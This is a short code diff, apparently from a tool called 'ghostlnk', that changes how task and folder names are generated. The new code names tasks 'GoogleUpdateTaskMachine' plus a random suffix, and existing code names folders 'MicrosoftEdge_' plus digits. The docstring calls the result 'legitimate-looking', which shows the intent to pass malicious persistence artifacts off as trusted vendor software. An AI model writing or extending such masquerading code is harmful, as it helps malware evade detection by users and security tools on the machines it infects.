@@ -3,7 +3,6 @@ import json
 import base64
 import uuid
 import random
-from datetime import datetime
 
 CONFIG_FILE = "ghostlnk_config.json"
 
@@ -45,4 +44,6 @@ def generate_random_folder_name() -> str:
     return f"MicrosoftEdge_{random.randint(10000,99999)}"
 
 def generate_task_name() -> str:
-    return str(uuid.uuid4())
+    """Generate a legitimate‑looking Google Update task name."""
+    suffix = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
+    return f"GoogleUpdateTaskMachine{suffix}"
